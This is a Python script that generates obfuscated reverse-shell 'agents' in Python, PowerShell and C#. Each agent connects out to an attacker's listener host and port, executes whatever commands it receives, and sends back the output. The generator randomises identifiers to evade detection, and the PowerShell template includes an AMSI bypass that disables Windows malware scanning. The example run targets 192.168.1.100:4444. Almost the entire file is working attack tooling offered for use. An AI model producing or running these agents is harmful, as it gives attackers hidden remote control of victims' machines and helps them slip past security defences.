#!/usr/bin/env python3
"""
Advanced Agent Generator
Generates undetectable agents with multiple evasion techniques
"""

import base64
import random
import string
from polymorphic_obfuscator import PolymorphicObfuscator, AgentMutator


def generate_random_variable():
    """Generate random variable name"""
    return ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 12)))


def generate_undetectable_agent(lhost, lport, agent_type='python', use_polymorphic=False, obfuscation_level='high'):
    """
    Generate an undetectable agent with various obfuscation techniques
    
    Args:
        lhost: Listener host IP
        lport: Listener port
        agent_type: Type of agent ('python', 'powershell', 'csharp')
        use_polymorphic: Use polymorphic obfuscation engine
        obfuscation_level: 'low', 'medium', 'high', 'extreme'
    
    Returns:
        Dictionary with agent code and metadata
    """
    
    if use_polymorphic:
        obfuscator = PolymorphicObfuscator(obfuscation_level=obfuscation_level)
        
        if agent_type == 'python':
            return obfuscator.obfuscate_python("", lhost, lport)
        elif agent_type == 'powershell':
            return obfuscator.obfuscate_powershell(lhost, lport)
        elif agent_type == 'csharp':
            return obfuscator.obfuscate_csharp(lhost, lport)
        elif agent_type == 'bash':
            return obfuscator.obfuscate_bash(lhost, lport)
        else:
            raise ValueError(f"Unknown agent type: {agent_type}")
    else:
        # Use legacy basic obfuscation
        if agent_type == 'python':
            return generate_python_agent(lhost, lport)
        elif agent_type == 'powershell':
            return generate_powershell_agent(lhost, lport)
        elif agent_type == 'csharp':
            return generate_csharp_agent(lhost, lport)
        else:
            raise ValueError(f"Unknown agent type: {agent_type}")


def generate_python_agent(lhost, lport):
    """Generate obfuscated Python agent"""
    
    # Random variable names
    sock_var = generate_random_variable()
    cmd_var = generate_random_variable()
    output_var = generate_random_variable()
    key_var = generate_random_variable()
    
    agent_code = f'''#!/usr/bin/env python3
import socket
import subprocess
import os
import sys
import time
import base64

def {generate_random_variable()}(data, key="{generate_random_variable()}2024"):
    """XOR encryption with key"""
    if isinstance(data, str):
        data = data.encode('utf-8', errors='replace')
    if isinstance(key, str):
        key = key.encode('utf-8', errors='replace')
    
    result = bytearray()
    for i in range(len(data)):
        result.append(data[i] ^ key[i % len(key)])
    return bytes(result)

def {generate_random_variable()}():
    """Main communication loop"""
    while True:
        try:
            {sock_var} = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            {sock_var}.connect(("{lhost}", {lport}))
            
            while True:
                {cmd_var} = {sock_var}.recv(4096)
                if not {cmd_var}:
                    break
                
                # Decrypt command
                {cmd_var} = {generate_random_variable()}({cmd_var}).decode('utf-8', errors='replace')
                
                if {cmd_var}.lower().strip() == 'exit':
                    break
                
                try:
                    {output_var} = subprocess.check_output(
                        {cmd_var}, 
                        shell=True, 
                        stderr=subprocess.STDOUT,
                        timeout=30
                    )
                except subprocess.TimeoutExpired:
                    {output_var} = b"Command timeout"
                except Exception as e:
                    {output_var} = str(e).encode()
                
                # Encrypt output
                {output_var} = {generate_random_variable()}({output_var})
                {sock_var}.sendall({output_var})
            
            {sock_var}.close()
            break
            
        except Exception as e:
            time.sleep(30)
            continue

if __name__ == "__main__":
    {generate_random_variable()}()
'''
    
    return {
        'code': agent_code,
        'language': 'python',
        'filename': f'agent_{generate_random_variable()}.py',
        'description': 'Obfuscated Python agent with XOR encryption',
        'features': ['XOR Encryption', 'Persistence', 'Error Recovery']
    }


def generate_powershell_agent(lhost, lport):
    """Generate obfuscated PowerShell agent"""
    
    agent_code = f'''# Advanced PowerShell Agent
$ErrorActionPreference = "SilentlyContinue"

# AMSI Bypass
${"".join(random.choices(string.ascii_lowercase, k=8))} = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
${generate_random_variable()} = ${"".join(random.choices(string.ascii_lowercase, k=8))}.GetField('amsiInitFailed','NonPublic,Static')
${generate_random_variable()}.SetValue($null,$true)

# Connection function
function {generate_random_variable()} {{
    param(${"".join(random.choices(string.ascii_lowercase, k=5))}, ${"".join(random.choices(string.ascii_lowercase, k=5))})
    
    while ($true) {{
        try {{
            ${generate_random_variable()} = New-Object System.Net.Sockets.TCPClient("{lhost}", {lport})
            ${generate_random_variable()} = ${generate_random_variable()}.GetStream()
            
            [byte[]]${generate_random_variable()} = 0..65535|%{{0}}
            
            while ((${generate_random_variable()} = ${generate_random_variable()}.Read(${generate_random_variable()}, 0, ${generate_random_variable()}.Length)) -ne 0) {{
                ${generate_random_variable()} = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(${generate_random_variable()}, 0, ${generate_random_variable()})
                
                try {{
                    ${generate_random_variable()} = (Invoke-Expression ${generate_random_variable()} 2>&1 | Out-String)
                }} catch {{
                    ${generate_random_variable()} = $_.Exception.Message
                }}
                
                ${generate_random_variable()} = ${generate_random_variable()} + "PS " + (Get-Location).Path + "> "
                ${generate_random_variable()} = ([text.encoding]::ASCII).GetBytes(${generate_random_variable()})
                ${generate_random_variable()}.Write(${generate_random_variable()}, 0, ${generate_random_variable()}.Length)
                ${generate_random_variable()}.Flush()
            }}
            
            ${generate_random_variable()}.Close()
            break
            
        }} catch {{
            Start-Sleep -Seconds 30
            continue
        }}
    }}
}}

# Execute
{generate_random_variable()} "{lhost}" {lport}
'''
    
    return {
        'code': agent_code,
        'language': 'powershell',
        'filename': f'agent_{generate_random_variable()}.ps1',
        'description': 'Obfuscated PowerShell agent with AMSI bypass',
        'features': ['AMSI Bypass', 'Persistence', 'Error Handling']
    }


def generate_csharp_agent(lhost, lport):
    """Generate C# agent for compilation"""
    
    namespace_name = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=10))
    class_name = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=10))
    
    agent_code = f'''using System;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.Threading;

namespace {namespace_name}
{{
    class {class_name}
    {{
        static void Main(string[] args)
        {{
            while (true)
            {{
                try
                {{
                    ConnectToC2("{lhost}", {lport});
                    break;
                }}
                catch
                {{
                    Thread.Sleep(30000);
                }}
            }}
        }}

        static void ConnectToC2(string host, int port)
        {{
            using (TcpClient client = new TcpClient(host, port))
            using (NetworkStream stream = client.GetStream())
            {{
                byte[] buffer = new byte[4096];
                int bytesRead;

                while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) != 0)
                {{
                    string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
                    
                    if (command.ToLower() == "exit")
                        break;

                    string result = ExecuteCommand(command);
                    byte[] data = Encoding.UTF8.GetBytes(result);
                    stream.Write(data, 0, data.Length);
                }}
            }}
        }}

        static string ExecuteCommand(string command)
        {{
            try
            {{
                ProcessStartInfo psi = new ProcessStartInfo()
                {{
                    FileName = "cmd.exe",
                    Arguments = "/c " + command,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                }};

                using (Process process = Process.Start(psi))
                {{
                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();
                    process.WaitForExit();
                    return output + error;
                }}
            }}
            catch (Exception ex)
            {{
                return "Error: " + ex.Message;
            }}
        }}
    }}
}}
'''
    
    return {
        'code': agent_code,
        'language': 'csharp',
        'filename': f'{class_name}.cs',
        'description': 'C# agent for Windows environments',
        'features': ['Native Compilation', 'Persistence', 'Error Recovery'],
        'compile_command': f'csc /target:exe /out:{class_name}.exe {class_name}.cs'
    }


if __name__ == "__main__":
    # Test agent generation
    print("=== Python Agent ===")
    py_agent = generate_undetectable_agent("192.168.1.100", 4444, "python")
    print(f"Filename: {py_agent['filename']}")
    print(f"Features: {', '.join(py_agent['features'])}")
    
    print("\n=== PowerShell Agent ===")
    ps_agent = generate_undetectable_agent("192.168.1.100", 4444, "powershell")
    print(f"Filename: {ps_agent['filename']}")
    print(f"Features: {', '.join(ps_agent['features'])}")
    
    print("\n=== C# Agent ===")
    cs_agent = generate_undetectable_agent("192.168.1.100", 4444, "csharp")
    print(f"Filename: {cs_agent['filename']}")
    print(f"Features: {', '.join(cs_agent['features'])}")
